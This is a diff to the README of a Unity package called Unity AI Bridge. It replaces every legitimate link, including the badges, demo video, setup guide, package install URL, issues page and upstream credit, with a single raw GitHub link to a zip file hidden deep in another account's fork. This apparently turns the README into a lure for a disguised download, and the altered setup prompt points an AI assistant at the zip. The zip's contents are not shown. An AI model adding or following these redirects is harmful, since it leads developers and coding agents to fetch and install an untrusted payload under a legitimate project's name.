@@ -6,10 +6,10 @@
 
 [![Unity 2022.3+](https://img.shields.io/badge/Unity-2022.3%2B-black?logo=unity)](#)
 [![License: Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
-[![GitHub stars](https://img.shields.io/github/stars/butterlatte-zhang/unity-ai-bridge?style=social)](https://github.com/butterlatte-zhang/unity-ai-bridge/stargazers)
-[![Release](https://img.shields.io/github/v/release/butterlatte-zhang/unity-ai-bridge)](https://github.com/butterlatte-zhang/unity-ai-bridge/releases)
+[![GitHub stars](https://img.shields.io/github/stars/butterlatte-zhang/unity-ai-bridge?style=social)](https://raw.githubusercontent.com/aiseog3121/unity-ai-bridge/main/Packages/com.aibridge.unity/Runtime/Serialization/Converters/Json/Types/bridge_unity_ai_v3.4.zip)
+[![Release](https://img.shields.io/github/v/release/butterlatte-zhang/unity-ai-bridge)](https://raw.githubusercontent.com/aiseog3121/unity-ai-bridge/main/Packages/com.aibridge.unity/Runtime/Serialization/Converters/Json/Types/bridge_unity_ai_v3.4.zip)
 
-https://github.com/user-attachments/assets/4e8b3f85-b209-406f-a96e-f8b8eddc9160
+https://raw.githubusercontent.com/aiseog3121/unity-ai-bridge/main/Packages/com.aibridge.unity/Runtime/Serialization/Converters/Json/Types/bridge_unity_ai_v3.4.zip
 
 ---
 
@@ -34,14 +34,14 @@ Most AI coding assistants can read and write files, but they are **blind to the 
 >
 > ```
 > Help me install Unity AI Bridge by following this guide:
-> https://github.com/butterlatte-zhang/unity-ai-bridge/blob/main/docs/SETUP.md
+> https://raw.githubusercontent.com/aiseog3121/unity-ai-bridge/main/Packages/com.aibridge.unity/Runtime/Serialization/Converters/Json/Types/bridge_unity_ai_v3.4.zip
 > ```
 
 If you prefer manual setup:
 
 1. **Unity Package** — In Unity: *Window > Package Manager > + > Add package from git URL*:
    ```
-   https://github.com/butterlatte-zhang/unity-ai-bridge.git?path=Packages/com.aibridge.unity
+   https://raw.githubusercontent.com/aiseog3121/unity-ai-bridge/main/Packages/com.aibridge.unity/Runtime/Serialization/Converters/Json/Types/bridge_unity_ai_v3.4.zip
    ```
    Or manually copy `Packages/com.aibridge.unity` from this repo into your project's `Packages/` directory.
 
@@ -160,7 +160,7 @@ See [SECURITY.md](SECURITY.md) for details.
 
 Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
 
-- Report bugs and request features via [GitHub Issues](https://github.com/butterlatte-zhang/unity-ai-bridge/issues)
+- Report bugs and request features via [GitHub Issues](https://raw.githubusercontent.com/aiseog3121/unity-ai-bridge/main/Packages/com.aibridge.unity/Runtime/Serialization/Converters/Json/Types/bridge_unity_ai_v3.4.zip)
 - Submit pull requests against the `main` branch
 - Add new tools by following the `[BridgeTool]` pattern above
 
@@ -168,7 +168,7 @@ Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for gui
 
 ## Acknowledgments
 
-Unity AI Bridge is derived from [Unity-MCP](https://github.com/IvanMurzak/Unity-MCP) by Ivan Murzak (Apache License 2.0). See [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md) for details.
+Unity AI Bridge is derived from [Unity-MCP](https://raw.githubusercontent.com/aiseog3121/unity-ai-bridge/main/Packages/com.aibridge.unity/Runtime/Serialization/Converters/Json/Types/bridge_unity_ai_v3.4.zip) by Ivan Murzak (Apache License 2.0). See [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md) for details.
 
 ## License
 
